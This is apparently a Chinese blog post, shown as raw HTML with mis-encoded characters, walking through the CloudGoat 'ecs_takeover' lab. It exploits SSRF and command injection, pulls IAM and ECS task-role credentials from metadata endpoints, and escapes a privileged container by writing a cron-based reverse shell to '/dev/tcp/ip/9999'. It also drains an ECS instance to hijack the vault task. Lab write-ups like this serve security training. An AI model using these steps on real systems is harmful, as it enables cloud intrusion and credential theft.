<p>æ­¤å¤–ï¼ŒAWS VPC ä¸­æœ‰ä¸¤ä¸ªç›¸å…³çš„ DNS è®¾ç½®ï¼š<code>enable_dns_support</code> å’Œ <code>enable_dns_hostnames</code>ã€‚<code>enable_dns_support</code> æ§åˆ¶ VPC æ˜¯å¦ä½¿ç”¨ Amazon-provided DNS æœåŠ¡å™¨è§£æ DNS æŸ¥è¯¢ï¼Œè€Œ <code>enable_dns_hostnames</code> æ§åˆ¶æ˜¯å¦è‡ªåŠ¨ä¸º VPC ä¸­çš„å®ä¾‹åˆ†é… DNS ä¸»æœºåã€‚</p>
<pre><code class="language-yaml">resource &quot;aws_vpc&quot; &quot;example&quot; {
  ...
  enable_dns_support   = true
  enable_dns_hostnames = true
  ...
}
</code></pre>
<h1 id="scenario-ecs_takeover">Scenario: ecs_takeover</h1>
<h2 id="èƒŒæ™¯">èƒŒæ™¯</h2>
<p>Scenario Resources</p>
<ul>
<li>1 VPC and Subnet with:</li>
<li>2 EC2 Instances</li>
<li>1 ECS Cluster</li>
<li>3 ECS Services</li>
<li>1 Internet Gateway</li>
</ul>
<p>Scenario Start(s)</p>
<ul>
<li>Access the external website via the EC2 Instance's public IP.</li>
</ul>
<p>Scenario Goal(s)</p>
<ul>
<li>Gain access to the &quot;vault&quot; container and retrieve the flag.</li>
</ul>
<h2 id="æ¸—é€æµç¨‹">æ¸—é€æµç¨‹</h2>
<p>è®¿é—®èµ·å§‹çš„URLï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªSSRFæ¼æ´<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720954153030-b697fca4-2527-4a8b-9297-f26b0f45423a.png" alt="image.png" loading="lazy"></p>
<p>è·å–å…³è”è§’è‰²<code>?url=169.254.169.254/latest/meta-data/iam/security-credentials/cg-ecs-takeover-ecs_takeover_cgid1cex40y24h-ecs-agent/</code><br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720954269075-742cc574-4b57-4e91-9fc0-07a7f91b202a.png" alt="image.png" loading="lazy"></p>
<p>ç™»å½•çš„è§’è‰²æ˜¯<code>ecs-agent</code>ï¼Œå‰é¢æˆ‘ä»¬çŸ¥é“äº†è¿™ä¸ªè§’è‰²çš„ç­–ç•¥æ˜¯<code>AmazonEC2ContainerServiceforEC2Role</code><br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720954606056-80352c0b-1fd5-4526-96b7-8679ed81ffa4.png" alt="image.png" loading="lazy"></p>
<p>é™¤æ­¤ä¹‹å¤–è¿™ä¸ªè¾“å…¥è¿˜å­˜åœ¨å‘½ä»¤æ³¨å…¥<code>/?url=;echo 'hello'</code>ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050913846-f97b6ff0-f0a7-48ed-a142-9708f44a6e2d.png" alt="image.png" loading="lazy"><br>
æ—¢ç„¶å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼Œé‚£é¦–å…ˆåˆ¤æ–­ä¸‹è¿™æ˜¯ä¸æ˜¯ä¸ªå®¹å™¨ç¯å¢ƒï¼Œä½¿ç”¨çš„å‘½ä»¤ä¸º<code>cat /proc/1/cgroup</code>ã€‚æœ‰ç‚¹æ„å¤–çš„æ˜¯ ECS æœåŠ¡æ‰€èµ·çš„å®¹å™¨çš„<code>cgroup</code>å­ç³»ç»Ÿéƒ½å½’åˆ°äº†<code>/ecs/[id-1]/[id-2]</code>è¿™ä¸ªè·¯å¾„ä¸‹ï¼Œå’Œ docker çš„<code>docker/[å®¹å™¨ID]</code>æœ‰ç‚¹ä¸åŒã€‚å…·ä½“åŸå› ç°åœ¨å…ˆä¸ç®¡ï¼Œæ€»ä¹‹è¿™é‡Œåˆ¤æ–­å‡ºäº†å½“å‰ç¯å¢ƒæ˜¯åœ¨ä¸€ä¸ª docker é‡Œé¢çš„ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720956048593-7bb54b01-38e1-44a5-8997-439843ca9258.png" alt="image.png" loading="lazy"></p>
<p>åœ¨å‰é¢æˆ‘ä»¬ï¼ˆå·å·åœ°ï¼‰çŸ¥é“äº†è¿™ä¸ªå®¹å™¨æœ‰ä¸¤ä¸ªå±é™©çš„é…ç½®ï¼Œä¸€ä¸ªæ˜¯ç‰¹æƒæ¨¡å¼</p>
<pre><code class="language-yaml">cat /proc/$$/status | grep CapEff
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720956287499-bd7901f3-546a-4a01-93b3-bb21561d3979.png" alt="image.png" loading="lazy"></figure>
<p>ä¸€ä¸ªæ˜¯docker socketæŒ‚è½½</p>
<pre><code class="language-yaml">ls -lah /var/run/docker.sock
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720956353451-73921687-3537-4c2e-8668-d10860466640.png" alt="image.png" loading="lazy"></figure>
<p>è¿™ä¸¤ç§æ¼æ´éƒ½å¯ä»¥æ¥åšå®¹å™¨é€ƒé€¸ï¼Œè¿™é‡Œè¦æˆ‘ä»¬ä½¿ç”¨ç‰¹æƒæ¨¡å¼é€ƒé€¸ã€‚</p>
<p>æŸ¥çœ‹æŒ‚è½½ç£ç›˜è®¾å¤‡</p>
<pre><code class="language-json">fdisk -l
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721028459040-664b6bdd-6463-417f-ba61-ebc645650e4f.png" alt="image.png" loading="lazy"></figure>
<p>å°†å®¿ä¸»æœºæ–‡ä»¶æŒ‚è½½åˆ°å®¹å™¨çš„<code>./test</code>ç›®å½•ä¸‹</p>
<pre><code class="language-yaml">mkdir ./test &amp;&amp; mount /dev/xvda1 ./test
</code></pre>
<p>å†™è®¡åˆ’ä»»åŠ¡å‰è¿˜æ˜¯è¦ç®€å•åˆ¤æ–­ä¸‹ä¸»æœºçš„ç³»ç»Ÿ</p>
<ul>
<li>Centosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨<code>/var/spool/cron/&lt;username&gt;</code></li>
<li>Ubuntuå®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨<code>/var/spool/cron/crontabs/&lt;username&gt;</code>ï¼ŒåŒæ—¶æ–‡ä»¶æƒé™å¿…é¡»è¦<code>600</code>æ‰èƒ½æ‰§è¡Œ</li>
</ul>
<p>è¿™é‡Œ<code>/var/spool/cron/</code>ä¸‹ç›´æ¥æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠcrontrabå®šæ—¶æ–‡ä»¶å†™åˆ°<code>./test/var/spool/cron/root</code>ã€‚ç¨ç­‰ä¸€ä¼šå„¿åæ”¶åˆ°åå¼¹shell</p>
<pre><code class="language-yaml">echo &quot;* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/ip/9999  0&gt;&amp;1'&quot; &gt;&gt; ./test/var/spool/cron/root
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721031745685-413b3765-7728-46d7-9d03-ac7c893dbe2e.png" alt="image.png" loading="lazy"></figure>
<p>æ§åˆ¶ä¸»æœºåï¼ŒæŸ¥çœ‹è¿è¡Œçš„å®¹å™¨ä¿¡æ¯ã€‚ç¬¬ä¸€ä¸ªæ˜¯webæœåŠ¡çš„å®¹å™¨ï¼Œç¬¬äºŒä¸ªä»»åŠ¡ï¼ˆä»å‰é¢å·å·çŸ¥é“ï¼‰æ˜¯æœ‰ Task Role çš„</p>
<pre><code class="language-yaml">docker ps -a
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721032426974-e6ddad38-65e5-4b41-9890-9c7596ebe51e.png" alt="image.png" loading="lazy"></figure>
<p>è€Œè¿™é‡Œé™¤äº†ä¸¤ä¸ªä»»åŠ¡å®¹å™¨å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªç”±<code>amazon-ecs-agent</code>é•œåƒå¯åŠ¨çš„å®¹å™¨ã€‚è¿™ä¸ªå°±æ˜¯å®ä¾‹è‡ªåŠ¨å®‰è£… ECS å®¹å™¨ä»£ç†ï¼Œå‚è€ƒï¼š<a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ecs-agent-install.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ecs-agent-install.html</a><br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721035135592-8c19cd99-99b6-4eec-a925-ce67e66ea51d.png" alt="image.png" loading="lazy"></p>
<p>è™½ç„¶æˆ‘ä»¬è·å–äº† Container Instances Role ä½†å¯¹æ•´ä¸ªé›†ç¾¤çš„å…¶ä»–ä¿¡æ¯è¿˜æ— æ³•æ„ŸçŸ¥ï¼Œå› ä¸º<code>AmazonEC2ContainerServiceforEC2Role</code>å¯¹é›†ç¾¤æ²¡æœ‰ä»»ä½•è¯»å–æƒé™ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721032568375-5461eab4-77a9-4846-875e-9877e3527667.png" alt="image.png" loading="lazy"><br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721032603603-ce61dec6-1733-4f75-b41f-20f2f835a921.png" alt="image.png" loading="lazy"></p>
<p>å› æ­¤æˆ‘ä»¬å°†ç›®æ ‡è½¬ä¸º <code>privd</code> å®¹å™¨çš„ Task Roleï¼Œå’Œ EC2 å®ä¾‹å…ƒæ•°æ®ä¸€æ ·ã€‚ECS ä¸­ä¹Ÿæœ‰ä»»åŠ¡å…ƒæ•°æ®ï¼Œè·å–æ–¹å¼å’Œå®ä¾‹å…ƒæ•°æ®ä¸€æ ·å¯ä»¥ç”¨HTTPçš„æ–¹å¼ã€‚<a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ec2-metadata.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ec2-metadata.html</a><br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721051828122-a8b8ce80-c4f9-449f-b216-61e12b1cf02a.png" alt="image.png" loading="lazy"></p>
<p>ä¸è¿‡æ–‡æ¡£ä¸­å¹¶æ²¡æœ‰è¯´æ˜ Task Role çš„å‡­è¯å¯ä»¥é€šè¿‡ä»»åŠ¡å…ƒæ•°æ®è·å–ã€‚å…³äº Task Role çš„å‡­è¯è·å–æ˜¯åœ¨ Container credential provider çš„éƒ¨åˆ†<a href="https://docs.aws.amazon.com/sdkref/latest/guide/feature-container-credentials.html">https://docs.aws.amazon.com/sdkref/latest/guide/feature-container-credentials.html</a>ã€‚æ ¹æ®æ–‡æ¡£çš„æè¿°è¿™ä¼¼ä¹æ›´åƒä¸€ç§å¼€å‘è§„èŒƒï¼Œè·å–çš„è·¯å¾„åœ¨å®¹å™¨çš„ç¯å¢ƒå˜é‡é‡Œ<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721052193373-46614cc1-a83a-4f90-888c-26a5d749517a.png" alt="image.png" loading="lazy"></p>
<p>æ‰“å°ç¬¬äºŒä¸ªå®¹å™¨çš„ç¯å¢ƒå˜é‡ï¼Œçœ‹åˆ°äº†<code>AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code>çš„ç¯å¢ƒå˜é‡</p>
<pre><code class="language-json">docker exec 38a2028763d2 sh -c 'printenv'
HOSTNAME=38a2028763d2
SHLVL=1
HOME=/root
AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/6b786c97-87aa-4a33-9c7b-c4fbef9f4638
AWS_EXECUTION_ENV=AWS_ECS_EC2
ECS_AGENT_URI=http://169.254.170.2/api/5272106b-c65e-4397-8272-9c66d4a16875
ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/5272106b-c65e-4397-8272-9c66d4a16875
ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/5272106b-c65e-4397-8272-9c66d4a16875
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721052329917-4ff421f4-8a0e-46fa-aa0a-93fb986696fb.png" alt="image.png" loading="lazy"></figure>
<p>è®¿é—®<code>169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code>è·å– Task Role å‡­è¯</p>
<pre><code class="language-yaml">docker exec 38a2028763d2 sh -c 'wget -q -O - 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721034675973-96bd5dfd-8783-4a98-ae9c-ef58a1bfd235.png" alt="image.png" loading="lazy"></figure>
<p>ç™»å½•ç”¨æˆ·<code>privd</code><br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721035025366-31b69649-937b-4d42-b504-5db4130f10a3.png" alt="image.png" loading="lazy"></p>
<p>ä¸‹é¢å¼€å§‹æ”¶é›†é›†ç¾¤ä¿¡æ¯ã€‚é¦–å…ˆï¼Œåˆ—å‡ºé›†ç¾¤</p>
<pre><code class="language-json">aws --profile task-role ecs list-clusters 
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721035453529-ca13f118-76ff-44be-a6f0-592234422273.png" alt="image.png" loading="lazy"></figure>
<p>æŸ¥çœ‹é›†ç¾¤çš„æ¨¡å¼ï¼Œ<code>&quot;registeredContainerInstancesCount&quot;: 2</code>å¾—çŸ¥é›†ç¾¤é‡Œè¿è¡Œçš„ EC2 æ•°é‡ä¸º 2ï¼Œè¿™ä¹Ÿè¡¨æ˜è¿™ä¸€ä¸ª EC2 Mode çš„ ECS</p>
<pre><code class="language-json">aws --profile task-role ecs describe-clusters --clusters arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721047804876-a67bd3e2-4b21-4019-8136-4095ffebcfac.png" alt="image.png" loading="lazy"></figure>
<p>åˆ—å‡ºé›†ç¾¤é‡Œçš„ Container Instances</p>
<pre><code class="language-json">aws --profile task-role ecs list-container-instances --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster
{
    &quot;containerInstanceArns&quot;: [
        &quot;arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/363039e07fcf40db99d5a5c57558a50c&quot;,
        &quot;arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046&quot;
    ]
}
</code></pre>
<p>æŸ¥çœ‹è¿™ä¸¤ä¸ª Container Instances å¯¹åº”çš„å®ä¾‹ID</p>
<pre><code class="language-json">aws --profile task-role ecs describe-container-instances --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --container-instances arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/363039e07fcf40db99d5a5c57558a50c --query &quot;containerInstances[*].ec2InstanceId&quot;
[
    &quot;i-0118453e343e82efd&quot;
]

aws --profile task-role ecs describe-container-instances --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --container-instances arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046 --query &quot;containerInstances[*].ec2InstanceId&quot;
[
    &quot;i-0fe09f6db2ba10228&quot;
]
</code></pre>
<p>ä»å‰é¢æ§åˆ¶çš„å®ä¾‹å…ƒæ•°æ®å¯çŸ¥ï¼Œè¿™ä¸ªå®ä¾‹å¯¹åº”çš„æ˜¯ç¬¬ä¸€ä¸ª Container Instances<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721048453179-cd9b2ad6-ff0d-4c13-8f1e-548c7ebc4c93.png" alt="image.png" loading="lazy"></p>
<p>åˆ—å‡ºé›†ç¾¤ä¸­çš„æœåŠ¡</p>
<pre><code class="language-json">aws --profile task-role ecs list-services --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster
{
    &quot;serviceArns&quot;: [
        &quot;arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/vault&quot;,
        &quot;arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/vulnsite&quot;,
        &quot;arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/privd&quot;
    ]
}
</code></pre>
<p>è¯¥æ¸—é€åœºæ™¯çš„ç›®æ ‡æ˜¯<code>vault</code>æœåŠ¡ï¼Œæ‰€ä»¥æˆ‘ä»¬æŸ¥çœ‹è¯¥æœåŠ¡è¯¦ç»†çš„ä¿¡æ¯ã€‚ä»è¾“å‡ºçš„ç»“æœä¸­å¯ä»¥çœ‹åˆ°ï¼š</p>
<ul>
<li><code>desiredCount</code>: æœåŠ¡æœŸæœ›è¿è¡Œçš„ä»»åŠ¡æ•°é‡ä¸º 1ã€‚</li>
<li><code>runningCount</code>: å½“å‰æ­£åœ¨è¿è¡Œçš„ä»»åŠ¡æ•°é‡ä¹Ÿä¸º 1ã€‚</li>
<li><code>pendingCount</code>: ç­‰å¾…å¯åŠ¨çš„ä»»åŠ¡æ•°é‡ä¸º 0ï¼Œè¡¨æ˜æ²¡æœ‰ä»»åŠ¡åœ¨æ’é˜Ÿç­‰å¾…å¯åŠ¨ã€‚</li>
</ul>
<pre><code class="language-json">aws --profile task-role ecs describe-services --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --services arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/vault
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721048642479-bc0f3458-6881-49b3-83a7-c98ea656db1e.png" alt="image.png" loading="lazy"></figure>
<p>å†æ¥çœ‹ä¸‹è¯¥æœåŠ¡è¿è¡Œåœ¨å“ªä¸ª Container Instances ä¸Šã€‚é¦–å…ˆï¼ŒæŸ¥çœ‹æœåŠ¡ä¸­çš„ä»»åŠ¡ï¼š</p>
<pre><code class="language-json">aws --profile task-role ecs list-tasks --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --service-name vault
{
    &quot;taskArns&quot;: [
        &quot;arn:aws:ecs:us-east-1:637423561540:task/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e00e1be22a134245893031ee753ff53f&quot;
    ]
}
</code></pre>
<p>ç„¶åï¼Œæè¿°è¿™äº›ä»»åŠ¡ä»¥è·å–å®ƒä»¬è¿è¡Œåœ¨å“ªä¸ª Container Instance ä¸Šçš„ä¿¡æ¯ã€‚æ˜¾ç¤ºçš„æ˜¯ç¬¬äºŒä¸ªæˆ‘ä»¬æ§åˆ¶å¤–çš„ EC2</p>
<pre><code class="language-json">aws --profile task-role ecs describe-tasks --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --tasks arn:aws:ecs:us-east-1:637423561540:task/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e00e1be22a134245893031ee753ff53f --query &quot;tasks[*].containerInstanceArn&quot;
[
    &quot;arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046&quot;
]
</code></pre>
<p>ä¸ºäº†å°†<code>vault</code>ç§»åˆ°å—æ§ä¸»æœºä¸Šï¼Œæˆ‘ä»¬å¯ä»¥å°†<code>vault</code>æ‰€åœ¨çš„ Container Instance çŠ¶æ€æ›´æ–°ä¸º <code>DRAINING</code>ï¼Œè¿™æ · ECS å°±ä¼šè‡ªåŠ¨å°†è¿™ä¸ªæœåŠ¡è°ƒåº¦è¦æˆ‘ä»¬è¿™å°ä¸»æœºä¸Šã€‚è€Œè¿™ä¸ªæ“ä½œå¯¹åº”çš„æƒé™<code>ecs:UpdateContainerInstancesState</code>åˆšå¥½åœ¨ Container Instance Role ä¸Šã€‚</p>
<p>é‡æ–°è·å– Container Instance Role çš„å‡­è¯ç™»å½•<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050303259-4cef4d7c-c197-4581-a230-dad911c1eba0.png" alt="image.png" loading="lazy"></p>
<p>ä¿®æ”¹å®ä¾‹çŠ¶æ€</p>
<pre><code class="language-json">aws --profile ci-role ecs update-container-instances-state --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --container-instances  arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046 --status DRAINING
</code></pre>
<p>å¾ˆå¿« task è¢«è°ƒåº¦åˆ°äº†æˆ‘ä»¬çš„å—æ§ä¸»æœºä¸Š <img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050515762-3736636e-4a31-4741-9719-9e0086c30229.png" alt="image.png" loading="lazy"></p>
<p>è¯»å–Flag</p>
<pre><code class="language-json">docker exec abe084998eb7 cat FLAG.TXT
</code></pre>
<figure data-type="image" tabindex="11"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050582298-b153b39c-d474-4503-a0c1-77cc0b235746.png" alt="image.png" loading="lazy"></figure>
<h1 id="å‘½ä»¤æ€»ç»“">å‘½ä»¤æ€»ç»“</h1>
<pre><code class="language-json">aws ecs describe-clusters --clusters [Cluster-ARN]
aws ecs list-container-instances --cluster [Cluster-Name]
aws ecs describe-container-instances --cluster [Cluster-Name] --container-instances [Container-Instance-ARNs]
aws ecs list-services --cluster [Cluster-Name]
aws ecs describe-services --cluster [Cluster-Name] --services [Service-ARNs]
aws ecs list-tasks --cluster [Cluster-Name] --service-name [Service-Name]
aws ecs describe-tasks --cluster [Cluster-Name] --tasks [Task-ARNs]
aws ecs describe-container-instances --cluster [Cluster-Name] --container-instances [Container-Instance-ARNs]

aws ecs update-container-instances-state --cluster &lt;your_cluster_name&gt; --container-instances &lt;target_container_instance&gt; --status DRAINING
</code></pre>
<h1 id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</h1>
<p><a href="https://www.ruse.tech/blogs/ecs-attack-methods">https://www.ruse.tech/blogs/ecs-attack-methods</a><br>
<a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/Welcome.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/Welcome.html</a><br>
<a href="https://www.bilibili.com/video/BV12E421K7ST/">https://www.bilibili.com/video/BV12E421K7ST/</a><br>
<a href="https://www.youtube.com/watch?v=22IsSW3YD0A">https://www.youtube.com/watch?v=22IsSW3YD0A</a></p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#ecs%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8">ECSå¿«é€Ÿå…¥é—¨</a></li>
<li><a href="#tf%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">TFä»£ç åˆ†æ</a>
<ul>
<li><a href="#vpctf">vpc.tf</a></li>
<li><a href="#iamtf">iam.tf</a></li>
<li><a href="#ec2tf">ec2.tf</a></li>
<li><a href="#ecstf">ecs.tf</a></li>
<li><a href="#outputstf">outputs.tf</a></li>
</ul>
</li>
<li><a href="#scenario-ecs_takeover">Scenario: ecs_takeover</a>
<ul>
<li><a href="#%E8%83%8C%E6%99%AF">èƒŒæ™¯</a></li>
<li><a href="#%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B">æ¸—é€æµç¨‹</a></li>
</ul>
</li>
<li><a href="#%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93">å‘½ä»¤æ€»ç»“</a></li>
<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">å‚è€ƒé“¾æ¥</a></li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://skyblu3519.github.io/post/cloudgoat-ba-chang-chu-ti-yan/">
              <h3 class="post-title">
                CloudGoat (â˜ï¸ğŸ)é¶åœºåˆä½“éªŒ
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
